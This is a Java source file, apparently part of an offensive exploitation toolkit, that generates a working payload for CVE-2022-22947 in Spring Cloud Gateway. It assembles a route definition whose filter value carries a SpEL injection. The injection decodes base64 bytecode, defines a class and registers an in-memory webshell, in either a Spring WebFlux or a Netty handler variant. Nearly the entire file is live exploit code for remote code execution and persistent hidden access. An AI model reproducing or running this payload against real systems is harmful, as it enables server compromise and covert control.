package core.payloads;

import core.GenerateMemShell;
import core.enumtypes.PayloadType;
import core.memshell.NettyHandlerMemShell;
import core.utils.Util;

public class SpringGateWay_CVE_2022_22947 {
    public static Object getObject(PayloadType type, String path) throws Exception {
        String className = "";
        String base64CodeStr = "";
        String payloadTemplate = "{\"predicates\":[\n" +
                "{\n" +
                "\"name\":\"Path\",\n" +
                "\"args\":{\n" +
                "\t\"_genkey_0\":\"/{path}/**\"\n" +
                "}\n" +
                "}\n" +
                "],\n" +
                "  \"id\": \"{path}\",\n" +
                "  \"filters\": [{\n" +
                "    \"name\": \"AddResponseHeader\",\n" +
                "    \"args\": {\n" +
                "      \"name\": \"Result\",\n" +
                "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('{classname}',T(org.springframework.util.Base64Utils).decodeFromString('{code}'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/{path}')}\"\n" +
                "    }\n" +
                "  }],\n" +
                "  \"uri\": \"http://test.com\"\n" +
                "}";

        switch (type){
            case springwebfluxhandlermemshell:
                base64CodeStr = GenerateMemShell.generateMemShell("SpringWebfluxHandlerMemShell", "BASE64", "8");
                className = "SpringWebfluxHandlerMemShell";
                break;
            case nettyhandlermemshell:
                base64CodeStr = Util.base64Encode(Util.getClassBytes(NettyHandlerMemShell.class));
                className = "core.memshell.NettyHandlerMemShell";
                break;
        }
        // SpringWebfluxHandlerMemShell 采用了lambda表达式，需要jdk1.8+支持，因此采用动态编译

        return payloadTemplate.replace("{classname}", className).replace("{code}", base64CodeStr).replace("{path}", path).replace("\n", "");
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        String payload = getObject(type, trojanType).toString();
        return payload.getBytes();
    }
}
